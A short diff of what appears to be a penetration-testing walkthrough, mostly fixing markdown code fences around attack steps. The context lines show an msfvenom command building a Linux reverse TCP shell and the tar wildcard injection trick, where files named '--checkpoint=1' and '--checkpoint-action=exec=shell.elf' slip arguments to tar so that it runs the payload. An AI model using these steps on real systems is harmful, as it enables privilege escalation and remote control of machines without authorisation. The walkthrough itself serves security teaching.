@@ -3449,8 +3449,9 @@ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=53 -f elf
 remote host and make it executable:
 ```
 $ chmod +x /home/user/shell.elf
-
+```
 6. Create two files in the /home/user directory:
+
 ```
 $ touch /home/user/--checkpoint=1
 $ touch /home/user/--checkpoint-action=exec=shell.elf
